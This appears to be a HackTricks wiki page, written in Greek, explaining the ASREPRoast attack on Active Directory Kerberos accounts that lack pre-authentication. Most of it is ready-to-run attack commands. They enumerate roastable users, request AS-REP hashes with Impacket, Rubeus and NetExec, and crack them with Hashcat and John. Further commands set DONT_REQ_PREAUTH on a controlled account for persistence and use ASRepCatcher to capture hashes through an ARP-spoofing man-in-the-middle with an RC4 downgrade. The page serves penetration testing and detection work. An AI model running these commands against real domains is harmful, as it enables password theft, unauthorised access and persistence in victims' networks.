# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες οι οποίοι δεν διαθέτουν το **Kerberos pre-authentication required attribute**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους attackers να ζητήσουν authentication για έναν χρήστη από τον Domain Controller (DC), χωρίς να χρειάζονται το password του χρήστη. Στη συνέχεια, ο DC απαντά με ένα μήνυμα κρυπτογραφημένο με ένα key που προκύπτει από το password του χρήστη, το οποίο οι attackers μπορούν να προσπαθήσουν να κάνουν crack offline για να ανακαλύψουν το password του χρήστη.

Οι βασικές απαιτήσεις για αυτή την επίθεση είναι:

- **Lack of Kerberos pre-authentication**: Οι χρήστες-στόχοι δεν πρέπει να έχουν ενεργοποιημένη αυτή τη security λειτουργία.
- **Connection to the Domain Controller (DC)**: Οι attackers χρειάζονται πρόσβαση στον DC για να στείλουν requests και να λάβουν encrypted messages.
- **Optional domain account**: Η ύπαρξη domain account επιτρέπει στους attackers να εντοπίζουν πιο αποτελεσματικά τους vulnerable users μέσω LDAP queries. Χωρίς ένα τέτοιο account, οι attackers πρέπει να κάνουν guess τα usernames.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτημα μηνύματος AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Το Rubeus ζητά **RC4** από προεπιλογή, επομένως το Event ID **4768** συνήθως εμφανίζει **preauth type 0** και **ticket encryption type 0x17**. Αν προσθέσετε **`/aes`** (ή αν το RC4 είναι απενεργοποιημένο για τον στόχο), αναμένετε **AES etypes**.<sup>[[2]](#references)</sup>

#### Γρήγορα one-liners (Linux)

- Κάντε πρώτα enumerate τους πιθανούς στόχους (π.χ. από leaked build paths) με Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Κάντε roast μια ολόκληρη λίστα usernames χωρίς valid creds χρησιμοποιώντας NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Αν διαθέτετε creds, αφήστε το NetExec να κάνει query στο LDAP και να ζητήσει για εσάς κάθε roastable account: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Αν το output ξεκινά με **`$krb5asrep$23$`**, κάντε crack με το Hashcat **`-m 18200`**. Αν ξεκινά με **`$krb5asrep$17$`** ή **`$krb5asrep$18$`**, προτιμήστε το John με **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Μην υποθέτετε ότι κάθε AS-REP roast είναι RC4. Τα σύγχρονα εργαλεία μπορούν να επιστρέψουν **RC4** (`$krb5asrep$23$`) ή **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), ανάλογα με το requested/negotiated enctype. Το **`hashcat -m 18200`** αφορά το **etype 23**, ενώ το **John** χειρίζεται απευθείας το `krb5asrep` για τα **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Επιβάλετε να μην απαιτείται **preauth** για έναν χρήστη στον οποίο έχετε δικαιώματα **GenericAll** (ή δικαιώματα εγγραφής ιδιοτήτων):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast χωρίς credentials

Ένας attacker μπορεί να χρησιμοποιήσει μια θέση man-in-the-middle για να capture AS-REP packets καθώς αυτά μεταδίδονται στο δίκτυο, χωρίς να βασίζεται στην απενεργοποίηση του Kerberos pre-authentication. Επομένως, λειτουργεί για όλους τους users στο VLAN.\
Αν θέλετε το σχετικό no-credential trick που επιστρέφει ένα **service ticket** αντί για ένα **TGT** από έναν no-preauth principal, δείτε το [Kerberoast](kerberoast.md).

Το [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε. Το `relay` mode είναι το ενδιαφέρον από offensive άποψη, επειδή μπορεί να επιβάλει **RC4** όταν ο client εξακολουθεί να διαφημίζει **etype 23**· το `listen` παραμένει passive και απλώς capture-άρει ό,τι διαπραγματεύτηκαν ο client και το DC.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
